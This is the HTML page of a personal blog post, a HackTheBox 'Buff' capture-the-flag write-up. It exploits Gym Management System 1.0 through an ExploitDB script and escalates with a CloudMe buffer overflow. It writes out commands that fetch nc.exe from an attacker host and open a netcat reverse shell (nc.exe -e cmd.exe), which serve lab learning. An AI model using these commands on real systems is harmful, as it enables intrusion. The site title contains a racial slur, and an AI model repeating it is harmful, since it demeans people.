<!DOCTYPE html>
<html lang="en-US">
<head class="no-js">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="profile" href="http://gmpg.org/xfn/11">
	        <link rel="pingback" href="https://nathaneberhardt.com/xmlrpc.php">
	    <script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>
<title>HackTheBox &#8211; Buff &#8211; wutup  niggas</title>
<link rel="dns-prefetch" href="//fonts.googleapis.com">
<link rel="dns-prefetch" href="//s.w.org">
<link rel="alternate" type="application/rss+xml" title="wutup  niggas &raquo; Feed" href="https://nathaneberhardt.com/feed/">
<link rel="alternate" type="application/rss+xml" title="wutup  niggas &raquo; Comments Feed" href="https://nathaneberhardt.com/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="wutup  niggas &raquo; HackTheBox &#8211; Buff Comments Feed" href="https://nathaneberhardt.com/2020/10/10/hackthebox-buff/feed/">
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/nathaneberhardt.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.5"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}</style>
	<link rel="stylesheet" id="wp-block-library-css" href="https://nathaneberhardt.com/wp-includes/css/dist/block-library/style.min.css?ver=5.5.5" type="text/css" media="all">
<link rel="stylesheet" id="googlefonts-css" href="http://fonts.googleapis.com/css?family=Lora:400,500,600,700|Open+Sans:400&subset=latin" type="text/css" media="all">
<link rel="stylesheet" id="thesimplest-google-fonts-css" href="https://fonts.googleapis.com/css?family=Poppins%3A300%2C400%2C500%2C600%2C700%2C800%7CPT+Serif%3A400%2C400i%2C700%2C700i&#038;ver=5.5.5" type="text/css" media="all">
<link rel="stylesheet" id="bootstrap-css" href="https://nathaneberhardt.com/wp-content/themes/thesimplest/assets/css/bootstrap.min.css?ver=3.3.7" type="text/css" media="all">
<link rel="stylesheet" id="font-awesome-css" href="https://nathaneberhardt.com/wp-content/themes/thesimplest/assets/css/font-awesome.min.css?ver=4.7.0" type="text/css" media="all">
<link rel="stylesheet" id="thesimplest-style-css" href="https://nathaneberhardt.com/wp-content/themes/thesimplest/style.css?ver=5.5.5" type="text/css" media="all">
<script type="text/javascript" src="https://nathaneberhardt.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp" id="jquery-core-js"></script>
<link rel="https://api.w.org/" href="https://nathaneberhardt.com/wp-json/">
<link rel="alternate" type="application/json" href="https://nathaneberhardt.com/wp-json/wp/v2/posts/227">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://nathaneberhardt.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://nathaneberhardt.com/wp-includes/wlwmanifest.xml"> 
<link rel="prev" title="Windows Reconnaissance with CMD and PowerShell" href="https://nathaneberhardt.com/2020/09/24/windows-reconnaissance-guide/">
<link rel="next" title="Setting up a Minecraft Docker Server on Ubuntu 18.04 with Azure" href="https://nathaneberhardt.com/2020/11/07/setting-up-a-minecraft-server-on-ubuntu-18-04-with-azure-and-docker/">
<meta name="generator" content="WordPress 5.5.5">
<link rel="canonical" href="https://nathaneberhardt.com/2020/10/10/hackthebox-buff/">
<link rel="shortlink" href="https://nathaneberhardt.com/?p=227">
<link rel="alternate" type="application/json+oembed" href="https://nathaneberhardt.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnathaneberhardt.com%2F2020%2F10%2F10%2Fhackthebox-buff%2F">
<link rel="alternate" type="text/xml+oembed" href="https://nathaneberhardt.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnathaneberhardt.com%2F2020%2F10%2F10%2Fhackthebox-buff%2F&#038;format=xml">
	<style id="thesimplest-custom-header-styles" type="text/css">.site-branding .site-title a,
    .site-description {
        color: #11092d;
    }</style>

	<style type="text/css" id="custom-background-css">body.custom-background { background-color: #c9c9c9; }</style>
	<link rel="icon" href="https://nathaneberhardt.com/wp-content/uploads/2020/09/cropped-item-32x32.jpg" sizes="32x32">
<link rel="icon" href="https://nathaneberhardt.com/wp-content/uploads/2020/09/cropped-item-192x192.jpg" sizes="192x192">
<link rel="apple-touch-icon" href="https://nathaneberhardt.com/wp-content/uploads/2020/09/cropped-item-180x180.jpg">
<meta name="msapplication-TileImage" content="https://nathaneberhardt.com/wp-content/uploads/2020/09/cropped-item-270x270.jpg">
		<style type="text/css" id="wp-custom-css">/* change SyntaxHighlighter plugins styles */
    /* font-size */
    .syntaxhighlighter a,
    .syntaxhighlighter div,
    .syntaxhighlighter code,
    .syntaxhighlighter table,
    .syntaxhighlighter table td,
    .syntaxhighlighter table tr,
    .syntaxhighlighter table tbody,
    .syntaxhighlighter table thead,
    .syntaxhighlighter table caption,
    .syntaxhighlighter textarea {
        font-size: 14px !important;
    }
    /* top and bottom padding in code box */
    .syntaxhighlighter {
        padding: 1em 1em 1em 1em !important;
    }
    /* increaes line number and code line height */
    .syntaxhighlighter table td.gutter .line {
        padding: 3px 0.5em 3px 1em !important;
    }
    .syntaxhighlighter table td.code .line {
        padding: 3px 1em !important;
    }



.site-description {
	font-size:17px;
}

ul#menu-navbar.primary-menu li{
	/*border:1px solid black;*/
	margin-right:10px;
	margin-left:10px;
	font-size:22px;
}
.wp-block-separator is-style-wide {
	
}
h1.entry-title {
	font-size:2.8rem;

}
.hrcustom {
	border-top:1px solid #ccc;
}
/*
 * .wmic-group, .net-groupcss, .icacls-group, .netsh-group, .get-adcomputer, .termsrv-get,.spn-aduser {
	padding-left:25px;
}
.widget {
	border-top:none;
	border-bottom: 2px solid #f5f5f5;
	padding-bottom:30px;
	margin-top:0px;
	padding-top:none;
	margin-bottom:0px
}
*/

.widget_recent_entries {
	border-top:none;
}

#emairu {
	color:#cc0000;
}

.site-description {
	font-size:21px;
	font-weight:600;
	color:#999999;
}

.site-header {
	padding:0px;
	padding-top:20px;
}

p{
	font-family:'Lora';
	font-size:17px;

}

#secondary a{
	font-family:'Open Sans', Arial;

}

.sidebar {
	#border-left:2px solid #f5f5f5;

}
/**
.widget {

-webkit-box-shadow: 0px 2px 5px -1px rgba(0,0,0,0.59);
-moz-box-shadow: 0px 2px 5px -1px rgba(0,0,0,0.59);
box-shadow: 0px 2px 5px -1px rgba(0,0,0,0.59);
	margin:0px;
	margin-bottom:20px;
	padding:1.5em;
    background-color: hsla(0,0%,80.4%,.1);
}
#secondary {
	
}



#masthead {
	-webkit-box-shadow: 0 4px 6px -6px black;
	   -moz-box-shadow: 0 4px 6px -6px black;
	        box-shadow: 0 4px 6px -6px black;
}
.site-inner {
	background:white;
	background-image: url(https://nathaneberhardt.com/wp-content/uploads/2020/10/back-pattern.png)
}
#main {
	background:white;
	-webkit-box-shadow: 0px 2px 5px -1px rgba(0,0,0,0.59);
-moz-box-shadow: 0px 2px 5px -1px rgba(0,0,0,0.59);
box-shadow: 0px 2px 5px -1px rgba(0,0,0,0.59);
	padding:3.5em 6.5em 3.5em 6.5em;
}
#colophon {
	margin-top:20px;
}
**/




.post {
	box-shadow: 0 2px 2px 0 rgba(0,0,0,0.14), 0 1px 5px 0 rgba(0,0,0,0.12), 0 3px 1px -2px rgba(0,0,0,0.2);
	padding:2em;
	

}
.page-header {
	border:none;
	margin:0;
}
#masthead {
	    box-shadow: 0 2px 2px 0 rgba(0,0,0,0.14), 0 1px 5px 0 rgba(0,0,0,0.12), 0 3px 1px -2px rgba(0,0,0,0.2);

}

#content {
	width:80%;
}
.single-post .site .site-inner .container .row #main .post{
	box-shadow:none;
	background:white;
}</style>
		
</head>
<body class="post-template-default single single-post postid-227 single-format-standard custom-background">
    <div class="search-popup">
        <span class="search-popup-close"><i class="fa fa-times"></i></span>
        
<form action="https://nathaneberhardt.com/" method="get" role="search" id="searchform_topbar" class="search-top-bar-popup search-form">
	<label>
		<span class="screen-reader-text">Search for:</span>
		<input type="search" class="search-field-top-bar" id="search-field-top-bar" placeholder="Search &hellip;" value="" name="s">
	</label>
	<button type="submit" class="search-submit search-top-bar-submit" id="search-top-bar-submit">
        <span class="fa fa-search header-search-icon"></span>
        <span class="screen-reader-text">
            Search        </span>
    </button>
</form>
    </div>
<!-- .search-popup -->

<div id="page" class="site">
    <div class="site-inner">
        <a class="skip-link screen-reader-text" href="#content">Skip to content</a>

        <header id="masthead" class="site-header" role="banner">

        
        <div class="site-header-main">
            <div class="site-branding">
                                    <p class="site-title">
                        <a href="https://nathaneberhardt.com/" rel="home">
                            wutup  niggas                        </a>
                    </p>
                                    <p class="site-description">InfoSec Blogs</p>
                
            </div>
<!-- .site-branding -->

                        <div class="menu-wrapper">
                <button id="menu-toggle" class="menu-toggle toggled-on" aria-expanded="true" aria-controls="site-navigation social-navigation">Menu</button>
                <div id="site-header-menu" class="site-header-menu clearfix">

                        <nav id="site-navigation" class="main-navigation container" role="navigation" aria-label="Primary Menu">
				            <div class="menu-navbar-container"><ul id="menu-navbar" class="primary-menu">
<li id="menu-item-324" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-324"><a href="https://nathaneberhardt.com">Home</a></li>
<li id="menu-item-13" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13"><a href="https://nathaneberhardt.com/about/">About</a></li>
</ul></div>                        </nav><!-- .main-navigation -->
                </div>
<!-- .site-header-menu -->
            </div>
<!-- .menu-wrapper -->
            
        </div>
<!-- .site-header-main -->


    
</header>

        <div id="content" class="site-content container">

	<div id="primary" class="content-area row">
		<main id="main" class="site-main col-md-8 col-sm-12" role="main">

			
<article id="post-227" class="post-227 post type-post status-publish format-standard hentry category-hackthebox">

	<header class="entry-header">
		<h1 class="entry-title">HackTheBox &#8211; Buff</h1>
		<div class="entry-info">
			<span class="posted-on">Posted on <time class="entry-date published" datetime="2020-10-10T19:22:46+00:00">October 10, 2020</time><time class="updated" datetime="2020-11-26T07:47:11+00:00">November 26, 2020</time></span><span class="author-info"> by <a href="https://nathaneberhardt.com/author/user/">Nathan</a></span>		</div>
	</header>

	
	<div class="entry-content">
		
<figure class="wp-block-image size-large"><img loading="lazy" width="708" height="438" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/thumb.png" alt="" class="wp-image-396" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/thumb.png 708w, https://nathaneberhardt.com/wp-content/uploads/2020/11/thumb-300x186.png 300w" sizes="(max-width: 708px) 100vw, 708px"></figure>



<p>This is my first HackTheBox writeup, and I decided to write up on the &#8220;Buff&#8221; box that I did last month. It is a Windows OS machine with a difficulty of &#8220;Easy&#8221;, so it&#8217;s a good starting box for this series.</p>



<h2>User Flag:</h2>



<p>As always we want to start with an nmap scan to check for open ports/services. The &#8220;sV&#8221; flag is to scan for service versions: </p>



<figure class="wp-block-image size-large"><img loading="lazy" width="600" height="88" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/1.png" alt="" class="wp-image-428" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/1.png 600w, https://nathaneberhardt.com/wp-content/uploads/2020/11/1-300x44.png 300w" sizes="(max-width: 600px) 100vw, 600px"></figure>



<p>The nmap scan indicates that the host may be blocking ping probes, so we add the &#8220;-Pn&#8221; flag to the command:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="597" height="134" src="https://nathaneberhardt.com/wp-content/uploads/2020/10/2.png" alt="" class="wp-image-399" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/10/2.png 597w, https://nathaneberhardt.com/wp-content/uploads/2020/10/2-300x67.png 300w" sizes="(max-width: 597px) 100vw, 597px"></figure>



<p>We see that port 8080 is open and is running an Apache web server. We can go ahead and visit that site at 10.10.10.198:8080:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="692" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/3-1024x692.png" alt="" class="wp-image-429" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/3-1024x692.png 1024w, https://nathaneberhardt.com/wp-content/uploads/2020/11/3-300x203.png 300w, https://nathaneberhardt.com/wp-content/uploads/2020/11/3-768x519.png 768w, https://nathaneberhardt.com/wp-content/uploads/2020/11/3.png 1069w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Visiting the home page, it looks like a simple fitness website. The first set of actions I take when I discover a web site:</p>



<ol>
<li>Check all of the pages and their page soure&#8217;s for anything interesting</li>
<li>Run a dirbuster scan to find any hidden directories.</li>
<li>Test XSS and SQLi attacks on any input fields we find.</li>
<li>Capture the requests with BurpSuite to see if we can extract any data or manipulate the requests for a possible exploit. </li>
</ol>



<p>The login fields seemed to be properly sanitized, and the hidden files/directories didn&#8217;t lead me anywhere</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="479" height="359" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/5-1.png" alt="" class="wp-image-431" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/5-1.png 479w, https://nathaneberhardt.com/wp-content/uploads/2020/11/5-1-300x225.png 300w" sizes="(max-width: 479px) 100vw, 479px"></figure>



<p>While browsing the other pages of the site, I found an empty Contact page:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="362" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/7-2-1024x362.png" alt="" class="wp-image-434" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/7-2-1024x362.png 1024w, https://nathaneberhardt.com/wp-content/uploads/2020/11/7-2-300x106.png 300w, https://nathaneberhardt.com/wp-content/uploads/2020/11/7-2-768x272.png 768w, https://nathaneberhardt.com/wp-content/uploads/2020/11/7-2.png 1068w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Definitely a suspicious find, and the only text on the page was &#8220;Made using Gym Management Software 1.0.&#8221; After a quick search on this on ExploitDB I found this:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="1024" height="626" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/9-1024x626.png" alt="" class="wp-image-435" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/9-1024x626.png 1024w, https://nathaneberhardt.com/wp-content/uploads/2020/11/9-300x183.png 300w, https://nathaneberhardt.com/wp-content/uploads/2020/11/9-768x469.png 768w, https://nathaneberhardt.com/wp-content/uploads/2020/11/9.png 1064w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>According to the exploit, any website using the Gym Management System 1.0 could be vulnerable to unauthenticated remote code execution. It uses python 2, so you may have to run the exploit in a virtual environment if you&#8217;re having problems with python 3.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="917" height="442" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/10.png" alt="" class="wp-image-436" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/10.png 917w, https://nathaneberhardt.com/wp-content/uploads/2020/11/10-300x145.png 300w, https://nathaneberhardt.com/wp-content/uploads/2020/11/10-768x370.png 768w" sizes="(max-width: 917px) 100vw, 917px"></figure>



<p>The latest version of kali already has this exploit in the exploitdb directory, so all you have to do is copy it to your working directory and run it!</p>


<pre class="brush: bash; title: ; notranslate" title="">
$ cp /usr/share/exploitdb/exploits/php/webapps/48506.py/ .
</pre>

<pre class="brush: bash; title: ; notranslate" title="">
$ python 48506.py http://10.10.10.198:8080/
</pre>


<figure class="wp-block-image size-large"><img loading="lazy" width="408" height="114" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/12-1.png" alt="" class="wp-image-438" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/12-1.png 408w, https://nathaneberhardt.com/wp-content/uploads/2020/11/12-1-300x84.png 300w" sizes="(max-width: 408px) 100vw, 408px"></figure>



<p>And just like that we have a web shell! The next things I always do when trying to escalate my privileges on a windows machine is to upload the &#8220;nc.exe&#8221; and &#8220;plink.exe&#8221; binaries found in the &#8220;windows-binaries&#8221; directory on your kali box. nc.exe is netcat which allows you to upgrade to a better shell, and plink is used to forward ports not directly reachable from outside of the machine.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="450" height="118" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/13-1.png" alt="" class="wp-image-439" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/13-1.png 450w, https://nathaneberhardt.com/wp-content/uploads/2020/11/13-1-300x79.png 300w" sizes="(max-width: 450px) 100vw, 450px"></figure>



<p>Now we just need a way to get those binaries onto the victim machine. A really fast way to get this done is to setup a python simpleHTTPServer on your host that holds all of your binaries, and then download those binaries onto the victim machine with a web request command:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="613" height="148" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/19.png" alt="" class="wp-image-444" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/19.png 613w, https://nathaneberhardt.com/wp-content/uploads/2020/11/19-300x72.png 300w" sizes="(max-width: 613px) 100vw, 613px"></figure>



<p>With the webshell we have just created, we can perform an Invoke-WebRequest command to download the binaries onto the victim machine:</p>


<pre class="brush: bash; title: ; notranslate" title="">
C:\xampp\htdocs\gym\upload&gt; Invoke-WebRequest -Uri [attacking box ip]/nc.exe -OutFile &quot;nc.exe&quot;
</pre>


<p>With netcat successfully downloaded onto the victim machine, we can run a listening netcat connection on our kali box to create a reverse shell:</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="507" height="80" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/15.png" alt="" class="wp-image-441" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/15.png 507w, https://nathaneberhardt.com/wp-content/uploads/2020/11/15-300x47.png 300w" sizes="(max-width: 507px) 100vw, 507px"></figure>



<p>Then, we run the nc.exe binary to connect back to our host machine with the nc.exe binary we just uploaded</p>


<pre class="brush: bash; title: ; notranslate" title="">
C:\xampp\htdocs\gym\upload&gt; nc [attacking box ip]:4444
</pre>


<p>If all done correctly, you should have a new shell, and should be able to use normal cmd/powershell commands. While traversing the system directories, I found the user shaun and the user Administrator. the access to Administrator was denied, but I could cd into shaun&#8217;s directory; the user flag is on his Desktop. As for the Administrator flag, we will have to dive deeper into the system to try to find something to exploit.</p>



<figure class="wp-block-image size-large"><img loading="lazy" width="544" height="546" src="https://nathaneberhardt.com/wp-content/uploads/2020/11/23.png" alt="" class="wp-image-445" srcset="https://nathaneberhardt.com/wp-content/uploads/2020/11/23.png 544w, https://nathaneberhardt.com/wp-content/uploads/2020/11/23-300x300.png 300w, https://nathaneberhardt.com/wp-content/uploads/2020/11/23-150x150.png 150w" sizes="(max-width: 544px) 100vw, 544px"></figure>



<h2>Administrator/Root Flag:</h2>



<p>In the Download folder, there is an exe file named Cloudme1.11.2.exe that is running on a local port on the system. With a quick google search, I found that this file is vulnerable to Buffer Overflow. This is where the plink.exe comes in: we will forward the localport using cloudme to our host machine in order to exploit it with Buffer Overflow. Heres the metasploit payload I used:</p>


<pre class="brush: bash; title: ; notranslate" title="">
msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe [attacking host ip]' -b '\x00\x0a\x0d'
</pre>


<p>After running that in a compiled executable, you will be able to connect to the victim machines as Administrator! Just traverse into Desktop folder and grab your flag!</p>
	</div>
<!-- .entry-content -->

	<footer class="entry-footer clearfix"><span class="cat-tags-links"><span class="cat-links"><span class="cat-icon"><i class="fa fa-folder-open"></i></span><span class="screen-reader-text">Categories</span><a href="https://nathaneberhardt.com/category/hackthebox/" rel="category tag">HackTheBox</a></span></span></footer></article>

	<nav class="navigation post-navigation" role="navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links">
<div class="nav-previous"><a href="https://nathaneberhardt.com/2020/09/24/windows-reconnaissance-guide/" rel="prev"><span class="meta-nav" aria-hidden="true">Previous</span><span class="screen-reader-text">Previous post:</span> <span class="post-title">Windows Reconnaissance with CMD and PowerShell</span></a></div>
<div class="nav-next"><a href="https://nathaneberhardt.com/2020/11/07/setting-up-a-minecraft-server-on-ubuntu-18-04-with-azure-and-docker/" rel="next"><span class="meta-nav" aria-hidden="true">Next</span><span class="screen-reader-text">Next post:</span> <span class="post-title">Setting up a Minecraft Docker Server on Ubuntu 18.04 with Azure</span></a></div>
</div>
	</nav>
<div id="comments" class="comments-area">

	
	
		<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="https://nathaneberhardt.com/2020/10/10/hackthebox-buff/#respond" style="display:none;">Cancel reply</a></small>
</h3>
<form action="https://nathaneberhardt.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate>
<p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> Required fields are marked <span class="required">*</span></p>
<p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p>
<p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" required="required"></p>
<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" required="required"></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200"></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes"> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment"> <input type="hidden" name="comment_post_ID" value="227" id="comment_post_ID">
<input type="hidden" name="comment_parent" id="comment_parent" value="0">
</p>
</form>	</div>
<!-- #respond -->
	
</div>
<!-- .comments-area -->
		</main><!-- .site-main -->
		
<aside id="secondary" class="sidebar widget-area col-md-4 col-sm-12" role="complementary">
	
		<section id="recent-posts-2" class="widget widget_recent_entries">
		<h4 class="widget-title">Recent Posts</h4>
		<ul>
											<li>
					<a href="https://nathaneberhardt.com/2021/01/17/hackthebox-worker/">HackTheBox &#8211; Worker</a>
									</li>
											<li>
					<a href="https://nathaneberhardt.com/2020/11/07/setting-up-a-minecraft-server-on-ubuntu-18-04-with-azure-and-docker/">Setting up a Minecraft Docker Server on Ubuntu 18.04 with Azure</a>
									</li>
											<li>
					<a href="https://nathaneberhardt.com/2020/10/10/hackthebox-buff/" aria-current="page">HackTheBox &#8211; Buff</a>
									</li>
											<li>
					<a href="https://nathaneberhardt.com/2020/09/24/windows-reconnaissance-guide/">Windows Reconnaissance with CMD and PowerShell</a>
									</li>
											<li>
					<a href="https://nathaneberhardt.com/2020/09/24/mcsg/">History of Minecraft Survival Games and battle royale</a>
									</li>
					</ul>

		</section><section id="archives-2" class="widget widget_archive"><h4 class="widget-title">Archives</h4>
			<ul>
					<li><a href="https://nathaneberhardt.com/2021/01/">January 2021</a></li>
	<li><a href="https://nathaneberhardt.com/2020/11/">November 2020</a></li>
	<li><a href="https://nathaneberhardt.com/2020/10/">October 2020</a></li>
	<li><a href="https://nathaneberhardt.com/2020/09/">September 2020</a></li>
			</ul>

			</section><section id="categories-2" class="widget widget_categories"><h4 class="widget-title">Categories</h4>
			<ul>
					<li class="cat-item cat-item-1">
<a href="https://nathaneberhardt.com/category/guides/">Guides</a>
</li>
	<li class="cat-item cat-item-4">
<a href="https://nathaneberhardt.com/category/hackthebox/">HackTheBox</a>
</li>
	<li class="cat-item cat-item-3">
<a href="https://nathaneberhardt.com/category/misc/">Misc</a>
</li>
			</ul>

			</section></aside><!-- .sidebar .widget-area -->
	</div>
<!-- content-area -->

        </div>
<!-- .site-content -->
        
                <footer id="colophon" class="site-footer" role="contentinfo">
            <div class="site-info container">
                            <a href="https://wordpress.org/"><p>CopyrightÂ© 2020 Nathan Eberhardt</p></a>
            </div>
        </footer>
        
    </div>
<!-- site-inner -->
</div>
<!-- site -->

<script type="text/javascript" src="https://nathaneberhardt.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9b" id="syntaxhighlighter-core-js"></script>
<script type="text/javascript" src="https://nathaneberhardt.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushBash.js?ver=3.0.9b" id="syntaxhighlighter-brush-bash-js"></script>
<script type="text/javascript">
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "https://nathaneberhardt.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9b";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.head.appendChild( corecss );
		var themecssurl = "https://nathaneberhardt.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeRDark.css?ver=3.0.9b";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		document.head.appendChild( themecss );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['light'] = true;
	SyntaxHighlighter.defaults['pad-line-numbers'] = true;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();

	// Infinite scroll support
	if ( typeof( jQuery ) !== 'undefined' ) {
		jQuery( function( $ ) {
			$( document.body ).on( 'post-load', function() {
				SyntaxHighlighter.highlight();
			} );
		} );
	}
</script>
<script type="text/javascript" src="https://nathaneberhardt.com/wp-content/themes/thesimplest/assets/js/skip-link-focus-fix.js?ver=1.0" id="skip-link-focus-fix-js"></script>
<script type="text/javascript" src="https://nathaneberhardt.com/wp-content/themes/thesimplest/assets/js/bootstrap.min.js?ver=3.3.7" id="jquery-bootstrap-js"></script>
<script type="text/javascript" src="https://nathaneberhardt.com/wp-includes/js/comment-reply.min.js?ver=5.5.5" id="comment-reply-js"></script>
<script type="text/javascript" id="thesimplest-main-js-js-extra">
/* <![CDATA[ */
var thesimplest_screenReaderText = {"expand":"expand child menu","collapse":"collapse child menu"};
/* ]]> */
</script>
<script type="text/javascript" src="https://nathaneberhardt.com/wp-content/themes/thesimplest/assets/js/main.js?ver=1.0" id="thesimplest-main-js-js"></script>
<script type="text/javascript" src="https://nathaneberhardt.com/wp-includes/js/wp-embed.min.js?ver=5.5.5" id="wp-embed-js"></script>
</body>
</html>